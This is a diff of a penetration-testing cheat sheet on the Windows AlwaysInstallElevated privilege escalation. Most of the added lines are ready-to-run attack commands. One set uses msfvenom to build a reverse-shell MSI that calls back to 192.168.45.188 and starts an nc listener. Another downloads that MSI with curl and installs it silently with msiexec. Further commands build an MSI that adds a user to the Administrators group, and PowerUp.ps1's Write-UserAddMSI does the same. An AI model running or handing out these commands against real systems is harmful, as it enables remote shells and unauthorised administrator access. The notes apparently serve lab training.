@@ -1,5 +1,40 @@
-AlwaysInstallElevated: 
-Registry keys allowing MSI installs with elevated privileges.
+****  AlwaysInstallElevated = Registry keys allowing MSI installs with elevated privileges.
 
-Sample commands: 
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated; if set to 1, exploit by creating a malicious MSI
+Sample commands to check if AlwaysInstallElevated is enabled: 
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated; if set to 0x1, exploit by creating malicious MSI
+
+
+
+#######################################################################
+####### Sample Commands to exploit using reverse shell method #########
+#######################################################################
+
+# First Create malicious MSI on Kali and start a listener
+(kali㉿kali)-[~/tmp]-$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.188 LPORT=80 -f msi > evil.msi
+(kali㉿kali)-[~/tmp]-$ nc -nvlp 80
+
+# Move malicious file to windows target and execute. After execute you should have a hit in kali listener and confirm id with whoami
+PS C:\Users\david\Desktop> curl http://192.168.45.188/evil.msi -o C:\Users\david\Desktop\evil.msi
+PS C:\Users\david\Desktop> msiexec /quiet /qn /i C:\Users\david\Desktop\evil.msi
+
+
+
+#######################################################################
+####### Sample Commands to exploit by adding user to Administrator Group #########
+#######################################################################
+
+(kali㉿kali)-[~/tmp]-$ msfvenom -p windows/exec CMD="net localgroup administrators david /add" -f msi > addadmin.msi
+PS C:\Users\david\Desktop> net localgroup administrators
+PS C:\Users\david\Desktop> curl http://192.168.45.188/addadmin.msi C:\Users\david\Desktop\addadmin.msi
+PS C:\Users\david\Desktop> msiexec /quiet /qn /i C:\Users\david\Desktop\addadmin.msi
+PS C:\Users\david\Desktop> net localgroup administrators
+
+
+
+#######################################################################
+####### Sample Commands to use PowerUp.ps1 to create malicious msi on windows #########
+#######################################################################
+
+PS C:\Users\david\Desktop> Import-Module .\PowerUp.ps1
+PS C:\Users\david\Desktop> Write-UserAddMSI
+PS C:\Users\david\Desktop> msiexec /quiet /qn /i UserAdd.msi
